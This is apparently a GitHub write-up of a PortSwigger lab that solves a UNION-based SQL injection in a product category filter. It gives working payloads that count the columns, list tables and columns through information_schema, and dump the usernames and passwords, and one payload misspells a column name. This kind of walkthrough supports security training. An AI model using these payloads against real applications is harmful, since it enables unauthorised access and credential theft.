
# SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/examining-the-database

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


We see there are 2 values displayed in the table, the description and the content of the post:


<img width="1347" height="872" alt="1" src="https://github.com/user-attachments/assets/f2fa9c2d-3f33-4aed-9715-51168f8e34a7" />



We find these payload are valid to display the 4 posts in Gifts and the second all the items:

```
/filter?category=Pets'--
/filter?category=Pets'+or+1=1--
```

Also, that there are 2 columns returned by the query and we can do a UNION attack with the payload:

```
/filter?category=Pets'+union+all+select+NULL,NULL-- 
```

We can get the table names listing TABLE_NAME from information_schema.tables:

```
/filter?category=Pets'+union+all+select+'1',TABLE_NAME+from+information_schema.tables--
```


<img width="1517" height="797" alt="2" src="https://github.com/user-attachments/assets/b0b5559a-e28c-4213-a18a-7277bad7ce1b" />


Next list the columns in the table “users_ktgnak” with something like:

```
SELECT * FROM information_schema.columns WHERE table_name = 'users_ktgnak'
```

```
/filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+information_schema.columns+WHERE+table_name+=+'users_ktgnak'--
```

We get 2 column names:


<img width="1531" height="805" alt="3" src="https://github.com/user-attachments/assets/4ffcd72c-7c82-4a12-ba68-a5bb791a43d0" />



Next we must show the content of the table:

```
SELECT username_hhbeig,password_xmkssz FROM users_ktgnak
```

```
/filter?category=Pets'+union+all+select+username_hhbeigs,password_xmkssz+from+users_ktgnak--
```


<img width="1533" height="788" alt="4" src="https://github.com/user-attachments/assets/388cdab4-0153-480d-aeed-77b3e22e160c" />

